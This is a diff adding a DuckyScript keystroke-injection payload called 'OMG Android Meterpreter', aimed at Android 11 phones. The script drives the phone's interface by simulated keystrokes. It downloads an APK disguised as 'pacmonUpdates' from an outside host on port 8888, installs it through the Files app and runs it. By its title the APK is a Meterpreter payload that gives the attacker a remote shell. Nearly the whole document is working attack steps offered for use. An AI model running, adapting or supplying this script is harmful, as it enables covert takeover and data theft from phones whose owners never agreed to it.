@@ -1,0 +1,127 @@
+REM # Target: Android 11 moto g 
+REM -----------------------------------------------------------
+REM # Title: OMG Android Meterpreter
+REM # Description: Download and install an APK on Android. 
+REM # Alt payload approach of moving around the GUI with less tabs
+REM # Timing is very tight, you probably want to increase the delays
+REM # 
+REM # Author: @_MG_ butchered by @TestmanJ   
+REM # Target: Android 11
+REM # Notes: Set URL for APK payload below
+REM # -----------------------------------------------------------
+
+REM # -----------------------------------------------------------
+REM # clear screen (Not needed, but helps for demos)
+REM # -----------------------------------------------------------
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
+DELAY 1000
+
+REM # -----------------------------------------------------------
+REM # launch browser and download apk
+REM # -----------------------------------------------------------
+
+GUI b
+DELAY 5000
+CTRL l
+DELAY 2000
+STRING http://demobox.fun:8888/pacmonUpdates.apk
+DELAY 2000
+ENTER
+DELAY 2000
+
+REM # -----------------------------------------------------------
+REM # open apk with My Files and enable 
+REM # -----------------------------------------------------------
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
+DELAY 1000
+
+CTRL a
+DELAY 1000
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+STRING Files
+DELAY 1000
+TAB
+ENTER
+DELAY 4000
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+
+REM # Open Downloads and Install
+ENTER
+DELAY 1000
+TAB
+TAB
+ENTER 
+DELAY 1500	
+TAB
+ENTER
+DELAY 1500
+TAB
+ENTER
+DELAY 1000
+
+REM # Run It!
+GUI ENTER
+DELAY 1000
+GUI ENTER
+DELAY 1000
+
+CTRL a
+DELAY 1000
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+UP
+STRING MainAct
+DELAY 1000
+TAB
+ENTER
+DELAY 2000
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+ENTER
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
+ESC
